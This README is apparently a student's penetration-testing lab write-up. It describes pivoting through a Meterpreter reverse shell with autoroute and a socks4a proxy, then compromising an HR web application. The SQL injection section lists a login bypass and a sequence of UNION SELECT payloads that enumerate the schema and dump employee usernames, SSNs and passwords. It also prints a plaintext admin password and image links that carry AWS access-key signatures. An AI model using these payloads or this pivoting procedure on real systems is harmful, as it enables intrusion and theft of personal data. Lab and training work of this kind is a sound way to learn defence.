# Exploit-Companies-Database

<h2>Description</h2>
Project consists of exploiting the company by creating a proxy tunnel to gain access to the website and then, finding vulnerability in the website. 

<h2>Languages and Utilities Used</h2>

- <b>Putty(Linux)</b>
- <b>Remote Desktop</b>
- <b>Firefox</b>
- <b>Metasploit</b>


<h2>Environments Used </h2>

- <b>Amazon WorkSpace</b>

<h2>Proxy Tunnel</h2>

After viewing the screenshot we captured in the last task, I noticed a file/website on the desktop containing the HR Database. In order to access it I went through these steps.

 First set up a proxy tunnel

     To do this, I made sure my sessions were still running (my reverse shell and my persistence)
     
     

    From here, I went into the meterpreter reverse shell session to grab the IP address of the target machine
     
     

    I background the session to use autoroute (  use  post/multi/manage/autoroute)
     
     

    I used command show options to see what needed to be set
     
     

    I set the settings for the session to session of the reverse shell and set the subnet to the target ip address.
     
     

    Once those are set, I used command run to create a route to the target machine
     
     

    Next, I had to create a socks4a proxychain using command use  auxiliary/server/socks4a
     
     

    Same as before, sue command show options to see what settings need to be changed 
     
     

    In this case, I left the settings in default
     
     

    Now that all the meterpreter tunnel is set, I then went to my attack box to configure the proxy settings in firefox, so i can access the database
     
     

    Go to firefox network settings and customize proxy settings under manual. 
     
     

    In the socks sections, input linux ip and the port of the socks4a (default 1080)
     

     Read file to get URL
     
     

    Once the tunnel was set, I had to go back into the meterpreter to read the HR Database file.
     
     

    To do this, go to meterpreter session with the reverse shell
     
     

    Use command shell to get to the target machines command prompt
     
     

    Cd into C:\Users\HR-user\desktop
     
     

    Use command dir to show what is in this directory
     
     

    The HR Database should be in there
     
     

    Use command more "HR Database.url" to read file
     
     

    Here I found the url for the database



    Copy and paste the url into the firefox and it brought me to the login page
     

see images below for steps


<p align="center">
Migrate<br/>
<img src=https://s3.amazonaws.com/gbstool/submissions2020/269505/autoroute.PNG?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20240301T152332Z&X-Amz-SignedHeaders=host&X-Amz-Expires=36900&X-Amz-Credential=AKIAJBIZLMJQ2O6DKIAA%2F20240301%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=935f1314d48836b0af3478fc75a8ef6514e432211e589166dad6b4ab72297982
<br />

<p align="center">
Migrate<br/>
<img src=https://s3.amazonaws.com/gbstool/submissions2020/269505/socks4a.PNG?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20240301T152332Z&X-Amz-SignedHeaders=host&X-Amz-Expires=36900&X-Amz-Credential=AKIAJBIZLMJQ2O6DKIAA%2F20240301%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=a889af652b273a036bd68c38b1ea952b7b03b1f1e1adbb05f39399958de2d9aa
<br />

<p align="center">
Migrate<br/>
<img src=https://s3.amazonaws.com/gbstool/submissions2020/269505/socks4a.PNG?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20240301T152332Z&X-Amz-SignedHeaders=host&X-Amz-Expires=36900&X-Amz-Credential=AKIAJBIZLMJQ2O6DKIAA%2F20240301%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=a889af652b273a036bd68c38b1ea952b7b03b1f1e1adbb05f39399958de2d9aa
<br />

<p align="center">
Migrate<br/>
<img src=https://s3.amazonaws.com/gbstool/submissions2020/269505/firefoxproxy.PNG?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20240301T152332Z&X-Amz-SignedHeaders=host&X-Amz-Expires=36900&X-Amz-Credential=AKIAJBIZLMJQ2O6DKIAA%2F20240301%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=06fc806f4f0ae00d25ead3758943447fd9930a232dd0f77674b2d2f4225b3826
<br />

<p align="center">
Migrate<br/>
<img src=https://s3.amazonaws.com/gbstool/submissions2020/269505/entrance.PNG?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20240301T152333Z&X-Amz-SignedHeaders=host&X-Amz-Expires=36900&X-Amz-Credential=AKIAJBIZLMJQ2O6DKIAA%2F20240301%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=c9bdc273e1941f3d9eee91a452727fe6d7374a12dbb653dbabc8e90d2f68d3fb
<br />

<h2>SQL Injection</h2>

After investigating the HR website, I found that there was a vulnerability to a SQL Injection. To get into the website, I used ‘ 1=1 in both the username and the password. This allowed me to bypass the login page right to the information in the website. 

 

From here, I tested a bunch of sql injections to find all the information. I used union select to get started.

List of queries:

'union select null;--

'union select null, null;--

'union select null, null, null;--

'union select null, null,null,null;--

'union select null, null,null,null,null;--

‘union select null, null,null,null,null,null;--

'union select 1, null, null,null,null;--

'union select null, 2,null,null,null;--

'union select null, 2,3,null,null;--

'union select null, 2,3,4,null;--

'union select null, 2,3,4,5;--

'union select null,2,3,4,table_name from information_schema.tables where table_schema='hr';--

'union select null,2,3,column_name,table_name from information_schema.columns where table_schema='hr';--

'union select null,username,ssn,admin,employee_id from employees;--

'union select null,full_name,email,phone_number,employee_id from employees;--

'union select null,2.3,password,employee_id from shmeegle;--

'union select null,comment_id,message,date_created,employee_id from comments;--

<p align="center">
SQL<br/>
<img src=
<br />
   
<p align="center">
SQL<br/>
<img src=
<br />
  
<p align="center">
SQL<br/>
<img src=
<br />

<p align="center">
Migrate<br/>
<img src=file:///D:/Users/ut.ale.achazarreta/Pictures/sql%20employees%20info.PNG
<br />

<p align="center">
SQL<br/>
<img src=file:///D:/Users/ut.ale.achazarreta/Pictures/column&tablenames.PNG
<br />

<p align="center">
SQL<br/>
<img src=file:///D:/Users/ut.ale.achazarreta/Pictures/passwords.PNG
<br />

I found the admin information to get into the system. Signing in with admin gets the messages between employees and there was another search querey that can be used for cross-scripting.

Username: admin

Password: TEp2C1!n5o36

 
I created a spreadsheet of all the employee’s information.
